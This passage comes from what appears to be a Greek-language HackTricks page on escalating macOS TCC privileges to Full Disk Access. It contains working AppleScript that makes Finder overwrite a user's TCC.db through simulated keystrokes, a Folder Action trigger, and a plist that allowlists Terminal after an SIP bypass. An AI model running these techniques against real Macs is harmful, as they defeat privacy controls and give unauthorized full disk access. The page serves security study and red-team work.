set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**) για FDA\*

Το Automation στο **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) επιτρέπει την αποστολή **keystrokes σε processes**. Με αυτόν τον τρόπο, θα μπορούσατε να κάνετε abuse στο Finder ώστε να αλλάξετε το TCC.db των χρηστών ή να δώσετε FDA σε μια αυθαίρετη εφαρμογή (αν και ενδέχεται να ζητηθεί κωδικός πρόσβασης για αυτό).

Παράδειγμα overwrite του TCC.db των χρηστών από το Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` σε FDA\*

Ελέγξτε αυτή τη σελίδα για ορισμένα [**payloads για abuse των Accessibility permissions**](macos-tcc-payloads.md#accessibility) ώστε να κάνετε privesc σε FDA\* ή, για παράδειγμα, να εκτελέσετε ένα keylogger.

### **Endpoint Security Client σε FDA**

Αν έχετε **`kTCCServiceEndpointSecurityClient`**, έχετε FDA. Τέλος.

### System Policy SysAdmin File σε FDA

Το **`kTCCServiceSystemPolicySysAdminFiles`** επιτρέπει την **αλλαγή** του attribute **`NFSHomeDirectory`** ενός χρήστη, γεγονός που αλλάζει τον home folder του και επομένως επιτρέπει την **παράκαμψη του TCC**.<sup>[[5]](#references)</sup>

### User TCC DB σε FDA

Αν αποκτήσετε **δικαιώματα εγγραφής** στη **user TCC** database, **δεν μπορείτε** να παραχωρήσετε στον εαυτό σας δικαιώματα **`FDA`**· μόνο εκείνη που βρίσκεται στη system database μπορεί να τα παραχωρήσει.

Ωστόσο, μπορείτε να δώσετε στον εαυτό σας **Automation rights to Finder** και να κάνετε abuse την προηγούμενη τεχνική για privesc σε FDA\*.

### **FDA σε TCC permissions**

Το **Full Disk Access** έχει ως TCC όνομα το **`kTCCServiceSystemPolicyAllFiles`**.

Δεν νομίζω ότι αυτό αποτελεί πραγματικό privesc, αλλά σε περίπτωση που σας φανεί χρήσιμο: Αν ελέγχετε ένα πρόγραμμα με FDA, μπορείτε να **τροποποιήσετε τη user TCC database και να δώσετε στον εαυτό σας οποιαδήποτε πρόσβαση**. Αυτό μπορεί να είναι χρήσιμο ως τεχνική persistence, σε περίπτωση που χάσετε τα FDA permissions σας.

### **SIP Bypass σε TCC Bypass**

Η **TCC database** του συστήματος προστατεύεται από το **SIP**, γι' αυτό μόνο processes με τα **υποδεικνυόμενα entitlements θα μπορούν να την τροποποιήσουν**. Επομένως, αν ένας attacker βρει ένα **SIP bypass** σε ένα **file** (να μπορεί να τροποποιήσει ένα file που περιορίζεται από το SIP), θα μπορεί να:

- **Αφαιρέσει την προστασία** μιας TCC database και να παραχωρήσει στον εαυτό του όλα τα TCC permissions. Για παράδειγμα, θα μπορούσε να κάνει abuse οποιοδήποτε από αυτά τα files:
- Η TCC systems database
- REG.db
- MDMOverrides.plist

Ωστόσο, υπάρχει ακόμη μία επιλογή για abuse αυτού του **SIP bypass ώστε να γίνει bypass του TCC**: το file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` είναι μια allow list εφαρμογών που απαιτούν εξαίρεση TCC. Επομένως, αν ένας attacker μπορεί να **αφαιρέσει την SIP protection** από αυτό το file και να προσθέσει τη **δική του εφαρμογή**, η εφαρμογή θα μπορεί να κάνει bypass το TCC.\
Για παράδειγμα, για να προσθέσετε το terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Παρακάμψεις TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## Αναφορές

- [1] [Μια εις βάθος ανάλυση του macOS TCC.db - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script για την παρακολούθηση του com.apple.macl (Gist by brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Παρακολούθηση και αντιμετώπιση του com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Παράκαμψη των προστασιών απορρήτου χρηστών του macOS TCC κατά λάθος και εκ σχεδιασμού](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Αλλαγή του home directory και παράκαμψη του TCC, γνωστό και ως CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

{{#include ../../../../banners/hacktricks-training.md}}
